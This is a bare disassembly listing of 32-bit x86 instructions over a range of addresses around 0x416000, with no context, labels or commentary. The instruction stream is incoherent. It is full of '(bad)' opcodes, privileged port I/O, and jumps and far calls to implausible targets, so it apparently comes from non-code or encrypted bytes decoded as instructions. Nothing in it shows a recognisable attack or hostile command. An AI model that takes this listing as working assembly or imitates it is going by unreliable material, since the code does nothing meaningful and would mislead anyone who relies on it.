  41621d:	mov    cl,ah
  41621f:	mov    dl,BYTE PTR [eax+0x78773e36]
  416225:	adc    ebx,esp
  416227:	shr    DWORD PTR [edx-0x2d],1
  41622a:	cdq    
  41622b:	jo     0x4162a1
  41622d:	jmp    0xe037287c
  416232:	(bad)  
  416233:	xor    esp,DWORD PTR ds:0xac0b4aa1
  416239:	rcr    eax,cl
  41623b:	ins    DWORD PTR es:[edi],dx
  41623c:	and    ah,0xa3
  41623f:	jecxz  0x416276
  416241:	mov    al,0x1c
  416243:	adc    eax,0x12308bb0
  416248:	lahf   
  416249:	loopne 0x416205
  41624b:	sub    BYTE PTR [eax+0x49],0x89
  41624f:	cwde   
  416250:	push   edx
  416251:	sub    eax,0xf5c4202a
  416256:	cmp    eax,DWORD PTR fs:[ecx]
  416259:	add    eax,0x402faee2
  41625e:	lea    ebp,[ecx]
  416260:	test   BYTE PTR [ebx+0x1f],0x2d
  416264:	xor    al,0x49
  416266:	push   edi
  416267:	jns    0x41626a
  416269:	xacquire lock adc BYTE PTR [esi],0xc
  41626e:	push   ecx
  41626f:	pop    ebx
  416270:	sub    eax,0x6676cd91
  416275:	mov    bl,0x36
  416277:	cli    
  416278:	mov    WORD PTR [edi],ss
  41627a:	and    DWORD PTR [ecx-0x47],edx
  41627d:	xchg   esi,eax
  41627e:	xchg   edi,eax
  41627f:	(bad)  
  416280:	add    esp,ebx
  416282:	(bad)  
  416283:	mov    esp,0x2f316139
  416288:	pop    ebp
  416289:	aad    0x99
  41628b:	cmc    
  41628c:	sbb    dh,BYTE PTR [ebp+esi*2+0x6ba17513]
  416293:	push   esi
  416294:	inc    ebp
  416295:	jbe    0x4162d6
  416297:	push   edx
  416298:	xchg   edi,eax
  416299:	mov    ebp,esp
  41629b:	sbb    DWORD PTR cs:[eax],eax
  41629e:	fsub   st(5),st
  4162a0:	mov    ds:0x684fad6f,al
  4162a5:	loop   0x4162d4
  4162a7:	adc    BYTE PTR [edx],0xad
  4162aa:	pop    esi
  4162ab:	adc    BYTE PTR [edi+0x31],cl
  4162ae:	and    ecx,DWORD PTR [edi-0x3feed13]
  4162b4:	imul   edi,esi,0xd6121fc
  4162ba:	std    
  4162bb:	in     al,0x8a
  4162bd:	or     esi,DWORD PTR [edx]
  4162bf:	int    0xce
  4162c1:	mov    ds:0xacb08ca3,al
  4162c6:	push   ebp
  4162c7:	mov    dh,BYTE PTR [edx+0x19fd5d1d]
  4162cd:	test   DWORD PTR [ecx-0x36],ecx
  4162d0:	jb     0x416328
  4162d2:	pop    ss
  4162d3:	ret    
  4162d4:	cmc    
  4162d5:	push   esp
  4162d6:	jae    0x4162e0
  4162d8:	add    eax,0xbc373acb
  4162dd:	inc    esi
  4162de:	add    eax,0x94c5242e
  4162e3:	js     0x4162f2
  4162e5:	test   BYTE PTR [ebx],dh
  4162e7:	jp     0x4162e8
  4162e9:	jle    0x416351
  4162eb:	xor    BYTE PTR [esi],dh
  4162ed:	lock fsubp st(1),st
  4162f0:	in     eax,0x20
  4162f2:	and    eax,0x44988b71
  4162f7:	stc    
  4162f8:	cmp    eax,0x2291747f
  4162fd:	jnp    0x41635b
  4162ff:	(bad)  
  416300:	ret    0x9111
  416303:	xchg   ebp,eax
  416304:	out    0xf8,eax
  416306:	je     0x416330
  416308:	cmp    cl,bl
  41630a:	push   es
  41630b:	adc    al,0x5a
  41630d:	icebp  
  41630e:	(bad)  
  41630f:	fdivr  DWORD PTR [esi-0x4a]
  416312:	lea    esi,[eax+0xa]
  416315:	mov    edi,0x27ad6a82
  41631a:	call   FWORD PTR [esi]
  41631c:	bound  ebx,QWORD PTR [ebx-0x12ad439c]
  416322:	xchg   esi,eax
  416323:	retf   
  416324:	and    DWORD PTR [edx],edi
  416326:	repnz out dx,al
  416328:	pop    esp
  416329:	dec    ebx
  41632a:	sub    ah,BYTE PTR [edi]
  41632c:	rcl    DWORD PTR [ebp*1+0x6153447f],0x1b
  416334:	inc    eax
  416335:	push   ebx
  416336:	sbb    DWORD PTR [ebx],esp
  416338:	lock pop edi
  41633a:	mov    ebp,DWORD PTR [ebx-0xd]
  41633d:	(bad)  
  41633f:	repnz sub eax,DWORD PTR [edx-0x19]
  416343:	push   ds
  416344:	out    dx,al
  416345:	and    bh,dl
  416347:	dec    esi
  416348:	cmc    
  416349:	or     esi,DWORD PTR [edx-0x38]
  41634c:	push   ecx
  41634d:	pcmpeqw mm5,QWORD PTR [ecx]
  416350:	rcl    ebp,1
  416352:	cmp    al,0xba
  416354:	je     0x416334
  416356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416357:	xor    al,0x71
  416359:	jnp    0x416384
  41635b:	lahf   
  41635c:	xor    eax,0xeda12a97
  416361:	or     edx,DWORD PTR [ebx-0x4bb668be]
  416367:	xor    BYTE PTR [esi+ebp*8],ah
  41636a:	adc    eax,0xe11c15f7
  41636f:	or     ecx,DWORD PTR [ebp+0x2b0b1bf7]
  416375:	(bad)  
  416376:	pop    esi
  416377:	retf   0x9068
  41637a:	fbld   TBYTE PTR [edi]
  41637c:	or     ch,bl
  41637e:	sbb    DWORD PTR [ebx-0x1b15869f],ebx
  416384:	mov    edi,0xb2018a54
  416389:	inc    ebp
  41638a:	repz push 0xc5faa3eb
  416390:	retf   
  416391:	sbb    al,0xa3
  416393:	out    0x79,al
  416395:	pmovmskb eax,mm2
  416398:	adc    BYTE PTR [ebp+eax*8-0x57],0x71
  41639d:	outs   dx,BYTE PTR ds:[esi]
  41639e:	pop    edi
  41639f:	jl     0x4163b0
  4163a1:	inc    eax
  4163a2:	push   edi
  4163a3:	xor    al,0x8e
  4163a5:	mov    bh,0xa4
  4163a7:	arpl   bp,bp
  4163a9:	cli    
  4163aa:	jp     0x4163d6
  4163ac:	inc    ecx
  4163ad:	pop    edi
  4163ae:	retf   0x766f
  4163b1:	inc    ecx
  4163b2:	cli    
  4163b3:	popf   
  4163b4:	xchg   esi,eax
  4163b5:	mov    esi,ecx
  4163b7:	pop    eax
  4163b8:	sbb    ah,0x59
  4163bb:	add    esi,edi
  4163bd:	fld    QWORD PTR [edx-0x7a52d479]
  4163c3:	addr16 jns 0x4163f5
  4163c6:	pop    esi
  4163c7:	mov    WORD PTR [ebx-0x80],cs
  4163ca:	jmp    0x416396
  4163cc:	xor    BYTE PTR [ebx+esi*4+0x4b0a8d1c],cl
  4163d3:	adc    eax,0x5e0d1726
  4163d8:	or     DWORD PTR [ebp-0x233bb345],esp
  4163de:	mov    ecx,0x9addff0f
  4163e3:	(bad)  
  4163e4:	fwait
  4163e5:	cli    
  4163e6:	das    
  4163e7:	jne    0x4163ca
  4163e9:	push   0x303f1af5
  4163ee:	mov    cl,0xcc
  4163f0:	popa   
  4163f1:	xchg   edi,eax
  4163f2:	cmp    eax,0xf687bfc9
  4163f7:	sub    BYTE PTR [edi-0x6b4c20e8],bh
  4163fd:	out    0x41,eax
  4163ff:	adc    al,0x2
  416401:	xor    ch,BYTE PTR [edi+0x73c924a4]
  416407:	dec    eax
  416408:	div    BYTE PTR [edi+0x2c]
  41640b:	clc    
  41640c:	fs inc ebx
  41640e:	bound  ebx,QWORD PTR [ebp-0x21]
  416411:	and    eax,0xb5b1e00f
  416416:	dec    esi
  416417:	nop
  416418:	mov    eax,0xef84a04a
  41641d:	xor    al,0xff
  41641f:	sub    BYTE PTR [ebx+ebp*1],0xd3
  416423:	jle    0x41645d
  416425:	add    al,0xc9
  416427:	adc    DWORD PTR [edi-0x2b],edi
  41642a:	in     eax,dx
  41642b:	jle    0x416421
  41642d:	cli    
  41642e:	ins    DWORD PTR es:[edi],dx
  41642f:	stc    
  416430:	mov    esp,0x86e9406d
  416435:	sub    al,0xe3
  416437:	out    dx,al
  416438:	xor    al,0x79
  41643a:	inc    esp
  41643b:	sti    
  41643c:	pushf  
  41643d:	mov    ecx,DWORD PTR [esp+ebx*2]
  416440:	jge    0x4163cb
  416442:	and    dl,al
  416444:	push   es
  416445:	mov    esi,0x6db9f86c
  41644a:	dec    edi
  41644b:	scas   eax,DWORD PTR es:[edi]
  41644c:	icebp  
  41644d:	adc    eax,0xe3511fb6
  416452:	pop    esp
  416453:	bound  edx,QWORD PTR [esi]
  416455:	mov    ds:0x308963f8,eax
  41645a:	sub    bl,BYTE PTR [ebx-0x6b221c79]
  416460:	fdivr  st(5),st
  416462:	rol    DWORD PTR [edi+0x1],1
  416465:	jns    0x416417
  416467:	enter  0xdd54,0xfc
  41646b:	stos   DWORD PTR es:[edi],eax
  41646c:	xchg   ebp,eax
  41646d:	sahf   
  41646e:	inc    esp
  41646f:	push   eax
  416470:	enter  0x796d,0x81
  416474:	popf   
  416475:	lahf   
  416476:	sahf   
  416477:	mov    ecx,0x1fee5951
  41647c:	dec    edi
  41647d:	mov    ah,0x46
  41647f:	xchg   ebp,eax
  416480:	repnz dec edx
  416482:	or     ebx,DWORD PTR [ebp+0x628b1901]
  416488:	jb     0x416446
  41648a:	and    dh,BYTE PTR [ecx+0x273712f6]
  416490:	dec    ecx
  416491:	inc    eax
  416492:	mov    cl,0x4
  416494:	rcr    BYTE PTR [eax+0x10],0x98
  416498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416499:	sar    BYTE PTR [esi+0x21],1
  41649c:	adc    eax,0x8d0fd83e
  4164a1:	add    DWORD PTR es:[ecx+0x3d353fd],0xffffffca
  4164a9:	repnz leave 
  4164ab:	sub    eax,DWORD PTR [eax+0x209b813d]
  4164b1:	or     DWORD PTR [ebx],ecx
  4164b3:	(bad)  
  4164b4:	fdivr  DWORD PTR ds:0x981b6176
  4164ba:	fdivr  DWORD PTR [ebx+ebx*4-0x72]
  4164be:	dec    esp
  4164bf:	in     al,0xdf
  4164c1:	int    0xb0
  4164c3:	sub    edi,DWORD PTR [esi-0x1e4582f1]
  4164c9:	aas    
  4164ca:	fwait
  4164cb:	add    ah,BYTE PTR [ecx-0x56]
  4164ce:	fild   DWORD PTR [ebp-0x169be617]
  4164d4:	fmul   DWORD PTR [edi-0x1df53c3c]
  4164da:	jnp    0x416467
  4164dc:	pop    ecx
  4164dd:	cmp    DWORD PTR [eax],esp
  4164df:	mov    BYTE PTR [edx],0xdb
  4164e2:	mov    DWORD PTR [bp+si],esi
  4164e5:	(bad)  
  4164e7:	jae    0x41653a
  4164e9:	sbb    BYTE PTR [ecx-0x7],bh
  4164ec:	cmc    
  4164ed:	and    eax,esp
  4164ef:	and    al,0x42
  4164f1:	xor    BYTE PTR [eax+0x2b316c40],dl
  4164f7:	add    DWORD PTR [edx],edx
  4164f9:	imul   ecx,DWORD PTR [ecx+ebx*1],0xffffffd4
  4164fd:	cmp    DWORD PTR [ebx-0x73],ecx
  416500:	or     DWORD PTR [esi+0x4d],eax
  416503:	addr16 mov dh,0xb2
  416506:	stc    
  416507:	cli    
  416508:	ret    
  416509:	add    eax,0x1c7fc1be
  41650e:	xchg   esi,eax
  41650f:	xlat   BYTE PTR ds:[ebx]
  416510:	fld    st(0)
  416512:	ins    DWORD PTR es:[edi],dx
  416513:	stos   DWORD PTR es:[edi],eax
  416514:	test   DWORD PTR [edx+0x1602c683],eax
  41651a:	loopne 0x416531
  41651c:	dec    ebp
  41651d:	cwde   
  41651e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41651f:	sbb    BYTE PTR [esp+esi*2],ah
  416522:	aad    0xa
  416524:	sub    eax,0xcccd1385
  416529:	add    DWORD PTR [ecx+edi*8-0x79],eax
  41652d:	mov    ecx,0x8865c2f
  416532:	or     DWORD PTR [eax+eax*4+0x761373db],edi
  416539:	pushf  
  41653a:	sbb    al,0x40
  41653c:	push   0xffffff94
  41653e:	jmp    0x4164c5
  416540:	xor    al,0x3d
  416542:	lea    eax,[eax-0x58]
  416545:	xor    al,0x36
  416547:	mov    edi,0xfdf04548
  41654c:	not    DWORD PTR [ecx]
  41654e:	std    
  41654f:	fistp  QWORD PTR [ebx]
  416551:	lods   eax,DWORD PTR ds:[esi]
  416552:	push   0x208b49ef
  416557:	or     eax,0x62eb4883
  41655c:	and    eax,0x21
  416561:	add    al,bh
  416563:	pminsw mm6,QWORD PTR [edi-0x1]
  416567:	idiv   ebp
  416569:	(bad)  
  41656a:	repz push esi
  41656c:	retf   0x1f1
  41656f:	jle    0x41653f
  416571:	pop    ecx
  416572:	push   ebp
  416573:	jecxz  0x416575
  416575:	add    ah,dh
  416577:	add    al,0x0
  416579:	add    BYTE PTR [esi+0x2f],ch
  41657c:	mov    edi,edx
  41657e:	xor    ebx,ebx
  416580:	jno    0x416539
  416582:	mov    ds:0xfbf556e8,al
  416587:	mov    ebx,0x276e5765
  41658c:	test   eax,0x3b8e63f9
  416591:	cmp    eax,0x8a7c39f4
  416596:	(bad)  
  416597:	div    DWORD PTR [esi+0x2d]
  41659a:	push   edi
  41659b:	sub    BYTE PTR [eax+esi*1],bh
  41659e:	imul   esi,DWORD PTR [edi+0x7],0x56ae1768
  4165a5:	push   ebx
  4165a6:	push   eax
  4165a7:	xchg   esp,eax
  4165a8:	popa   
  4165a9:	test   eax,0x8135525b
  4165ae:	out    0x5d,eax
  4165b0:	pop    esp
  4165b1:	outs   dx,DWORD PTR ds:[esi]
  4165b2:	fidivr WORD PTR [edi-0x3371e9dc]
  4165b8:	fwait
  4165b9:	cmp    BYTE PTR [edi-0x649be737],0x1b
  4165c0:	add    ecx,esi
  4165c2:	shl    DWORD PTR [esi],0xec
  4165c5:	mov    ah,0x5b
  4165c7:	clc    
  4165c8:	das    
  4165c9:	push   0xffffff83
  4165cb:	mov    eax,ds:0xbb00f0b5
  4165d0:	mov    esp,DWORD PTR [ecx-0x5d]
  4165d3:	cmp    dl,BYTE PTR [edx-0x4be9f357]
  4165d9:	cli    
  4165da:	jns    0x416628
  4165dc:	mov    eax,0xe903ef2b
  4165e1:	mov    ds,WORD PTR [eax-0x7a]
  4165e4:	mov    eax,0x65dd6014
  4165e9:	ss mov bh,dh
  4165ec:	mov    DWORD PTR [esi-0x146f0274],eax
  4165f2:	rcr    DWORD PTR [ebx-0x1c],1
  4165f5:	mov    ah,0xa2
  4165f7:	adc    bl,ah
  4165f9:	pop    esi
  4165fa:	aas    
  4165fb:	cli    
  4165fc:	mov    al,0x4a
  4165fe:	push   ss
  4165ff:	loop   0x4165aa
  416601:	pop    esi
  416602:	mul    BYTE PTR [ecx]
  416604:	test   al,0x95
  416606:	inc    edx
  416607:	cmc    
  416608:	int    0x46
  41660a:	mov    ebp,edi
  41660c:	jmp    0x4165a3
  41660e:	hlt    
  41660f:	inc    edi
  416610:	xor    BYTE PTR ds:0xcac850af,al
  416616:	loop   0x4165f3
  416618:	or     eax,0x19ea69d1
  41661d:	pop    edx
  41661e:	jns    0x4165bf
  416620:	dec    ecx
  416621:	mov    ch,BYTE PTR [eax]
  416623:	in     eax,0x38
  416625:	shr    esp,1
  416627:	dec    edi
  416628:	xchg   esi,eax
  416629:	add    ecx,DWORD PTR [eax-0x2f]
  41662c:	in     eax,0x86
  41662e:	pop    ebp
  41662f:	push   0x5fcc529
  416634:	cli    
  416635:	stos   BYTE PTR es:[edi],al
  416636:	mov    ch,0x15
  416638:	nop
  416639:	inc    edi
  41663a:	cmp    cl,BYTE PTR [esi+0x345e0b3b]
  416640:	pop    edx
  416641:	mov    edx,0xd50278af
  416646:	fdiv   DWORD PTR [ebx+ecx*8-0x1e9c7519]
  41664d:	or     eax,0x96a8bc43
  416652:	xor    eax,0x59ec6773
  416657:	mov    edx,0x335ef00e
  41665c:	pop    ebx
  41665d:	xchg   DWORD PTR [ebx+0x44],esi
  416660:	adc    DWORD PTR fs:[ebx-0x6d],edi
  416664:	ss sti 
  416666:	jg     0x41666e
  416668:	lock jecxz 0x4166df
  41666b:	xlat   BYTE PTR ds:[ebx]
  41666c:	dec    ebx
  41666d:	add    eax,DWORD PTR [edx]
  41666f:	sbb    al,0x3e
  416671:	cmp    DWORD PTR [edx],ebx
  416673:	jnp    0x4166e6
  416675:	fisttp QWORD PTR [eax]
  416677:	xor    al,0x45
  416679:	mov    ds:0x9905099,al
  41667e:	push   ebp
  41667f:	pop    edi
  416680:	mov    bl,0x4b
  416682:	jno    0x4166b4
  416684:	out    0x7b,al
  416686:	inc    edx
  416687:	fadd   QWORD PTR [edi+0x5a]
  41668a:	(bad)  
  41668b:	push   cx
  41668d:	pusha  
  41668e:	push   ebp
  41668f:	(bad)  
  416690:	jo     0x4166f3
  416692:	xchg   bp,ax
  416694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416695:	and    eax,0x2e181cbe
  41669a:	hlt    
  41669b:	fistp  WORD PTR [esi-0x5ff0e0e4]
  4166a1:	sbb    BYTE PTR [esi-0x785de52a],0x79
  4166a8:	and    al,ch
  4166aa:	jp     0x416635
  4166ac:	pop    ds
  4166ad:	imul   ebx,DWORD PTR [ecx],0xffffffdb
  4166b0:	adc    bh,BYTE PTR [ecx]
  4166b2:	or     eax,0x6fbecb37
  4166b7:	cmp    eax,0x6c635348
  4166bc:	mov    WORD PTR [eax],es
  4166be:	push   edi
  4166bf:	xchg   edi,eax
  4166c0:	add    eax,0xdec63ee2
  4166c5:	inc    eax
  4166c6:	sti    
  4166c7:	nop
  4166c8:	fstp   st(1)
  4166ca:	lds    ebp,FWORD PTR ds:0x72f46f00
  4166d0:	push   ebp
  4166d1:	jp     0x416702
  4166d3:	retf   0xeb6b
  4166d6:	in     al,0x6f
  4166d8:	lea    ebp,[edx-0x19eb631f]
  4166de:	mov    ch,0xca
  4166e0:	int    0x43
  4166e2:	cmp    DWORD PTR [edi+0x2aadf5b0],ebx
  4166e8:	cmc    
  4166e9:	dec    esp
  4166ea:	clc    
  4166eb:	ret    
  4166ec:	inc    edx
  4166ed:	rcr    ebx,cl
  4166ef:	je     0x416708
  4166f1:	std    
  4166f2:	icebp  
  4166f3:	adc    al,BYTE PTR ds:0xc6075bfd
  4166f9:	cwde   
  4166fa:	fxch   st(5)
  4166fc:	push   ss
  4166fd:	push   ss
  4166fe:	adc    esi,DWORD PTR [ecx+ebp*4+0x50482aec]
  416705:	cmp    esp,DWORD PTR [ebx*2+0x63cc408d]
  41670c:	das    
  41670d:	pop    edi
  41670e:	cld    
  41670f:	inc    ebx
  416710:	push   esp
  416711:	fild   QWORD PTR ds:0x69f221a3
  416717:	popf   
  416718:	sbb    al,0xd
  41671a:	mov    ebx,0xdfd16e10
  41671f:	adc    al,0x1f
  416721:	sahf   
  416722:	jae    0x416744
  416724:	fnsave [eax+ecx*4-0x517c13ad]
  41672b:	out    0x8a,eax
  41672d:	xchg   ebx,eax
  41672e:	jg     0x416739
  416730:	imul   ecx,DWORD PTR [ebp+0x320274c8],0x5e828ec2
  41673a:	scas   al,BYTE PTR es:[edi]
  41673b:	mov    cl,0x57
  41673d:	call   0x254c:0x3778dab4
  416744:	pop    edi
  416745:	fidiv  WORD PTR [ecx]
  416747:	dec    ebx
  416748:	ret    
  416749:	js     0x416783
  41674b:	sahf   
  41674c:	loop   0x41676b
  41674e:	rcl    BYTE PTR [edi-0x3585a119],0xef
  416755:	sub    al,0xf3
  416757:	sbb    al,BYTE PTR [edi+0x6067477a]
  41675d:	sbb    bh,BYTE PTR [esi]
  41675f:	cmp    esp,DWORD PTR [ebp+ecx*8-0x24]
  416763:	or     eax,0xefecf039
  416768:	pop    edi
  416769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41676a:	shr    al,1
  41676c:	std    
  41676d:	and    DWORD PTR [edi],esp
  41676f:	sub    ebp,DWORD PTR [edi-0x4e68e012]
  416775:	in     al,dx
  416776:	scas   al,BYTE PTR es:[edi]
  416777:	xchg   esp,eax
  416778:	shl    al,1
  41677a:	rcl    BYTE PTR [ecx-0x60668a8f],0xb2
  416781:	push   esp
  416782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416783:	cdq    
  416784:	cs cmp eax,0x9d58a6e0
  41678a:	lods   al,BYTE PTR ds:[esi]
  41678b:	inc    edx
  41678c:	mov    ecx,0x73144a32
  416791:	cmp    BYTE PTR [ebx+eiz*8],dh
  416794:	cmp    ebx,DWORD PTR [ecx]
  416796:	adc    eax,0x4b984f8f
  41679b:	enter  0x2ba0,0x62
  41679f:	dec    ebx
  4167a0:	or     al,0xf
  4167a2:	rcr    BYTE PTR [eax-0xb],cl
  4167a5:	inc    edx
  4167a6:	aad    0xfe
  4167a8:	std    
  4167a9:	cmp    eax,edi
  4167ab:	adc    BYTE PTR [edx+0x169acf69],ah
  4167b1:	xlat   BYTE PTR ds:[ebx]
  4167b2:	cs mov ah,0xec
  4167b5:	inc    ebx
  4167b6:	in     eax,dx
  4167b7:	jp     0x41678f
  4167b9:	ret    0x9a9e
  4167bc:	pop    edx
  4167bd:	and    bh,BYTE PTR [eax]
  4167bf:	jns    0x4167cd
  4167c1:	inc    eax
  4167c2:	cmp    ch,BYTE PTR [eax-0x51cbe67c]
  4167c8:	lahf   
  4167c9:	dec    edx
  4167ca:	cli    
  4167cb:	xor    bl,BYTE PTR [edi+0x3248ec69]
  4167d1:	es retf 
  4167d3:	inc    ecx
  4167d4:	jbe    0x416828
  4167d6:	fdiv   DWORD PTR [ebp-0x41]
  4167d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167da:	or     eax,0x3d91a6bb
  4167df:	mov    ah,0x7b
  4167e1:	push   esp
  4167e2:	cmp    ch,cl
  4167e4:	and    BYTE PTR [eax],bl
  4167e6:	gs mov ah,0xf6
  4167e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167ea:	adc    DWORD PTR [edi-0x37],ecx
  4167ed:	leave  
  4167ee:	loope  0x4167c2
  4167f0:	sar    BYTE PTR [ebp-0x1c9e2cd2],1
  4167f6:	ficomp DWORD PTR [esi+0x5f037c5e]
  4167fc:	xlat   BYTE PTR ds:[ebx]
  4167fd:	pop    ebp
  4167fe:	clc    
  4167ff:	fst    QWORD PTR [edi+0x561f5b4c]
  416805:	cmp    bh,bh
  416807:	jp     0x4167d9
  416809:	push   es
  41680a:	mov    dl,BYTE PTR [esi-0x60135df4]
  416810:	clc    
  416811:	push   ebx
  416812:	cmp    DWORD PTR [ebx-0x68],0xfffffff1
  416816:	xor    BYTE PTR [ebx+0x50c7e020],ah
  41681c:	jo     0x4167a9
  41681e:	mov    al,ds:0xf365629
  416823:	fcomp  DWORD PTR [esi]
  416825:	dec    eax
  416826:	cmpxchg BYTE PTR [ebx-0x30927fa1],al
  41682d:	mov    ds:0x210e4747,al
  416832:	retf   
  416833:	sbb    dl,BYTE PTR [edi]
  416835:	pop    edi
  416836:	dec    edx
  416837:	imul   eax,DWORD PTR [edi],0x58
  41683a:	pop    eax
  41683b:	out    0x60,eax
  41683d:	ror    DWORD PTR [eax+eiz*2-0x1b],0xc5
  416842:	add    al,0xa
  416844:	pop    ds
  416845:	imul   edi,DWORD PTR [ecx+edx*2+0x3a],0x124f86ff
  41684d:	int3   
  41684e:	retf   0x1d60
  416851:	jle    0x4168d1
  416853:	or     BYTE PTR [edx+0x1e],dh
  416856:	mov    ch,0xf2
  416858:	(bad)  
  416859:	push   ecx
  41685a:	inc    esi
  41685b:	in     al,dx
  41685c:	popf   
  41685d:	push   cs
  41685e:	xchg   ebp,eax
  41685f:	(bad)  
  416860:	sub    eax,0xe1be6d1a
  416865:	jmp    0x3c02be52
  41686a:	mov    ds:0xe48bfbba,eax
  41686f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416870:	sti    
  416871:	iret   
  416872:	test   DWORD PTR [eax+edx*1+0x75ec0005],esi
  416879:	or     edi,DWORD PTR [eax-0x5f]
  41687c:	test   al,0x2e
  41687e:	clc    
  41687f:	lahf   
  416880:	repz xor cl,BYTE PTR [ecx]
  416883:	ret    
  416884:	sti    
  416885:	push   ss
  416886:	(bad)  
  416887:	shl    DWORD PTR es:[edx-0x1f],cl
  41688b:	sbb    DWORD PTR [edx+0x73],eax
  41688e:	cli    
  41688f:	pop    eax
  416890:	inc    ebp
  416891:	jmp    DWORD PTR [esi]
  416893:	cwde   
  416894:	outs   dx,DWORD PTR ds:[esi]
  416895:	sbb    eax,0x5a2a78b3
  41689a:	adc    cl,ch
  41689c:	je     0x4168d1
  41689e:	dec    ebp
  41689f:	or     DWORD PTR [edi-0xeb8a040],esp
  4168a5:	fxch   st(0)
  4168a7:	inc    esp
  4168a8:	loope  0x4168df
  4168aa:	iret   
  4168ab:	adc    esp,DWORD PTR ds:0x64e9e108
  4168b1:	aas    
  4168b2:	addr16 in eax,dx
  4168b4:	push   edx
  4168b5:	inc    ebp
  4168b6:	mov    bl,0x36
  4168b8:	push   cs
  4168b9:	or     DWORD PTR [esi+0x12],0xffffff9b
  4168bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168be:	adc    al,bl
  4168c0:	nop
  4168c1:	in     eax,dx
  4168c2:	inc    esi
  4168c3:	sbb    bh,cl
  4168c5:	push   cs
  4168c6:	pop    esi
  4168c7:	push   edi
  4168c8:	jbe    0x41685d
  4168ca:	scas   eax,DWORD PTR es:[edi]
  4168cb:	mov    ch,0xf7
  4168cd:	loope  0x416931
  4168cf:	jno    0x416917
  4168d1:	pushf  
  4168d2:	mov    WORD PTR [esi],gs
  4168d4:	nop
  4168d5:	push   0xbee2dea1
  4168da:	mov    BYTE PTR [eax],cl
  4168dc:	cmp    ah,ah
  4168de:	in     eax,0x89
  4168e0:	(bad)  
  4168e1:	pop    ecx
  4168e2:	xor    BYTE PTR [edx+0x5c9d0913],ch
  4168e8:	outs   dx,DWORD PTR ds:[esi]
  4168e9:	fiadd  WORD PTR [esi+0x9a37194]
  4168ef:	cmp    DWORD PTR [ecx-0xc],0xffffff82
  4168f3:	mov    bl,0x46
  4168f5:	fsub   QWORD PTR [eax-0x1f]
  4168f8:	add    eax,0x1e374b19
  4168fd:	not    ecx
  4168ff:	mov    bl,0xdd
  416901:	scas   eax,DWORD PTR es:[di]
  416903:	xchg   ebp,eax
  416904:	shr    DWORD PTR [edx],1
  416906:	pop    edi
  416907:	cmc    
  416908:	and    esp,DWORD PTR [esi]
  41690a:	dec    ebp
  41690b:	pop    ds
  41690c:	fsubr  st(6),st
  41690e:	jne    0x4168de
  416910:	inc    esi
  416911:	aam    0x2f
  416913:	xor    eax,0x2cc8a8cd
  416918:	rcl    esp,0xe
  41691b:	div    ebx
  41691d:	push   ebp
  41691e:	mov    eax,0x75ac173a
  416923:	std    
  416924:	out    0xd5,eax
  416926:	seto   BYTE PTR [edx-0x6c]
  41692a:	ror    DWORD PTR [ebx-0x73f4d9bd],1
  416930:	dec    ebp
  416931:	js     0x4168ca
  416933:	(bad)  
  416935:	pop    eax
  416936:	add    al,0x61
  416938:	mov    BYTE PTR [ecx+0x4c],0xe3
  41693c:	sub    al,0x27
  41693e:	dec    edx
  41693f:	cmc    
  416940:	in     eax,dx
  416941:	jecxz  0x416950
  416943:	inc    ecx
  416944:	stos   BYTE PTR es:[edi],al
  416945:	loope  0x416972
  416947:	(bad)  
  416948:	test   al,0xc8
  41694a:	sbb    al,0x2
  41694c:	or     eax,0x73332c04
  416951:	mov    edi,fs
  416953:	pop    edi
  416954:	call   0x913b6d13
  416959:	mov    WORD PTR [eax+0x4f15ca4d],ss
  41695f:	or     eax,0x473191c3
  416964:	dec    edi
  416965:	push   ecx
  416966:	mov    ?,edi
  416968:	sub    al,0x9c
  41696a:	xchg   ecx,eax
  41696b:	or     al,0x6a
  41696d:	(bad)  
  41696e:	outs   dx,DWORD PTR ds:[esi]
  41696f:	and    al,0x2b
  416971:	in     al,dx
  416972:	leave  
  416973:	jb     0x4169c7
  416975:	pop    edx
  416976:	pop    edx
  416977:	out    dx,al
  416978:	fs scas al,BYTE PTR es:[edi]
  41697a:	mov    esp,0x7d096332
  41697f:	jne    0x4169f2
  416981:	inc    eax
  416982:	cmp    esp,DWORD PTR ss:[edi]
  416985:	scas   al,BYTE PTR es:[edi]
  416986:	in     al,dx
  416987:	cmp    dh,BYTE PTR [ecx]
  416989:	add    cl,BYTE PTR [ebp+0x36aeb985]
  41698f:	push   ds
  416990:	sti    
  416991:	cwde   
  416992:	xor    ah,al
  416994:	xchg   ecx,eax
  416995:	das    
  416996:	data16 (bad) 
  416998:	lods   al,BYTE PTR ds:[esi]
  416999:	adc    ah,dl
  41699b:	and    ebp,DWORD PTR [ecx+0x21]
  41699e:	jl     0x416975
  4169a0:	div    DWORD PTR [esi-0xe]
  4169a3:	retf   
  4169a4:	cdq    
  4169a5:	pop    edx
  4169a6:	push   eax
  4169a7:	push   0xea0ec21d
  4169ac:	ja     0x416996
  4169ae:	das    
  4169af:	xchg   esi,eax
  4169b0:	call   0xbbbca2da
  4169b5:	pop    es
  4169b6:	jp     0x416a25
  4169b8:	mov    eax,0x79e0d68
  4169bd:	jns    0x416974
  4169bf:	jbe    0x4169fb
  4169c1:	out    0x74,al
  4169c3:	xor    al,0x11
  4169c5:	cld    
  4169c6:	add    eax,0x2bdaab65
  4169cb:	push   0xf5d473c3
  4169d0:	or     eax,0xad3cfbf0
  4169d5:	mov    al,BYTE PTR [ebx+0x11cad550]
  4169db:	jp     0x416a54
  4169dd:	sub    BYTE PTR [ebx+0x62035fab],0x38
  4169e4:	(bad)  
  4169e5:	loop   0x416a30
  4169e7:	and    dl,dh
  4169e9:	mov    eax,ds:0x15a9ffc5
  4169ee:	mov    dl,0xcf
  4169f0:	mov    ebx,DWORD PTR [ebx+0xb]
  4169f3:	mov    al,0x23
  4169f5:	ins    BYTE PTR es:[edi],dx
  4169f6:	fisttp QWORD PTR [ebx+ebp*4-0x4e]
  4169fa:	adc    DWORD PTR [edi],edx
  4169fc:	out    dx,eax
  4169fd:	add    DWORD PTR [eax],edi
